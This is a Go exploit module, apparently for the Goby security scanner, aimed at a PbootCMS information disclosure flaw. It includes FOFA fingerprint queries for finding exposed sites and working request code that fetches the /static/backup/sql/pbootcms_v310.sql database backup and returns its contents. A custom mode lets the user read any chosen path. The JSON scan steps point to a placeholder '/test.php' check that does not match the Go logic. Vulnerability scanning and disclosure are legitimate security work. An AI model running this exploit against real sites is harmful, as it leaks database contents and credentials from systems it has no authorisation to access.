package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "PbootCMS /static/backup/sql/pbootcms_v310.sql Information Disclosure Vulnerability",
    "Description": "<p>PbootCMS is an open-source content management system that aims to simplify the website building process. Based on the PHP language and MySQL database, it provides rich functions and an easy-to-use interface, including content management, user rights management, template system, plug-in extensions, etc. PbootCMS is highly customizable, and users can customize and extend it according to their needs. At the same time, it also has a responsive design that can adapt to the display of different devices, providing users with an excellent browsing experience.</p><p> An information breach is when sensitive information is inadvertently exposed to unauthorized individuals or entities due to a security flaw in an application, system, or service. This information may include personally identifiable information, usernames and passwords, security tokens, API keys, internal network details, source code, database schema, etc. Information breaches can be direct, such as incorrectly displaying information through a web page or API, or indirect, by analyzing an application's behavior or response to infer sensitive information.</p>",
    "Product": "PBOOTCMS",
    "Homepage": "http://www.pbootcms.com/",
    "DisclosureDate": "2024-10-30",
    "PostTime": "2024-10-30",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "banner=\"Set-Cookie: pbootsystem=\" || header=\"Set-Cookie: pbootsystem=\" || title=\"PbootCMS\" || (body=\"/css/animate.css\" && body=\"/css/bootstrap.min.css\" && body=\"fa fa-phone\") || body=\"http://www.pbootcms.com\"",
    "GobyQuery": "banner=\"Set-Cookie: pbootsystem=\" || header=\"Set-Cookie: pbootsystem=\" || title=\"PbootCMS\" || (body=\"/css/animate.css\" && body=\"/css/bootstrap.min.css\" && body=\"fa fa-phone\") || body=\"http://www.pbootcms.com\"",
    "Level": "2",
    "Impact": "<p>1. Attackers can access and obtain sensitive data, such as user information and enterprise secrets.</p><p> 2. In some cases, an attacker may exploit the vulnerability to execute system commands to control the affected system.</p>",
    "Recommendation": "<p>Add user identity authentication mechanism or token verification to increase permission control over the function points of the system.</p>",
    "References": [
        "https://blog.csdn.net/weixin_43167326/article/details/137541683"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "db_info",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "PbootCMS /static/backup/sql/pbootcms_v310.sql 信息泄露漏洞",
            "Product": "PBOOTCMS",
            "Description": "<p>PbootCMS是一款开源的内容管理系统，致力于简化网站建设过程。它基于PHP语言和MySQL数据库，提供了丰富的功能和易用的界面，包括内容管理、用户权限管理、模板系统、插件扩展等。PbootCMS具有高度可定制性，用户可以根据自己的需求进行定制和扩展。同时，它还具有响应式设计，能够适应不同设备的显示，为用户提供优秀的浏览体验。<br></p><p>信息泄露漏洞是指由于应用程序、系统或服务中存在的安全缺陷，导致敏感信息无意中被暴露给未经授权的个人或实体。这些信息可能包括个人身份信息、用户名和密码、安全令牌、API密钥、内部网络细节、源代码、数据库架构等。信息泄露可以是直接的，例如通过网页或API错误地显示信息，也可以是间接的，通过分析应用程序的行为或响应来推断出敏感信息。<br></p>",
            "Recommendation": "<p>加入用户身份认证机制或token验证，对系统的功能点增加权限控制。<br></p>",
            "Impact": "<p>1.攻击者可以访问并获取敏感数据，如用户信息、企业机密等。</p><p>&nbsp;2.部分情况下，攻击者可能利用漏洞执行系统命令，控制受影响的系统。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "PbootCMS /static/backup/sql/pbootcms_v310.sql Information Disclosure Vulnerability",
            "Product": "PBOOTCMS",
            "Description": "<p>PbootCMS is an open-source content management system that aims to simplify the website building process. Based on the PHP language and MySQL database, it provides rich functions and an easy-to-use interface, including content management, user rights management, template system, plug-in extensions, etc. PbootCMS is highly customizable, and users can customize and extend it according to their needs. At the same time, it also has a responsive design that can adapt to the display of different devices, providing users with an excellent browsing experience.</p><p>&nbsp;An information breach is when sensitive information is inadvertently exposed to unauthorized individuals or entities due to a security flaw in an application, system, or service. This information may include personally identifiable information, usernames and passwords, security tokens, API keys, internal network details, source code, database schema, etc. Information breaches can be direct, such as incorrectly displaying information through a web page or API, or indirect, by analyzing an application's behavior or response to infer sensitive information.<br></p>",
            "Recommendation": "<p>Add user identity authentication mechanism or token verification to increase permission control over the function points of the system.<br></p>",
            "Impact": "<p>1. Attackers can access and obtain sensitive data, such as user information and enterprise secrets.</p><p>&nbsp;2. In some cases, an attacker may exploit the vulnerability to execute system commands to control the affected system.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`

	postOrGet_4MOFgcJkvn := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		header := map[string]string{
			"User-Agent":                "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language":           "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
			"Cache-Control":             "no-cache",
			"Cookie":                    "lg=cn; PbootSystem=bkmjhrfecv12ku11nb68gh9etn",
			"Pragma":                    "no-cache",
			"Upgrade-Insecure-Requests": "1",
			"Connection":                "close",
		}

		resp, err := setGetRequest(hostInfo, fileUrl, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.RawBody, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/static/backup/sql/pbootcms_v310.sql"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/static/backup/sql/pbootcms_v310.sql": "数据库名",
			}
			// 函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"db_info": {"/static/backup/sql/pbootcms_v310.sql", "数据库名"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_4MOFgcJkvn

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}
			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}
			expResult.Output = "信息泄露\n" + resp
			expResult.Success = true
			return expResult
		},
	))
}
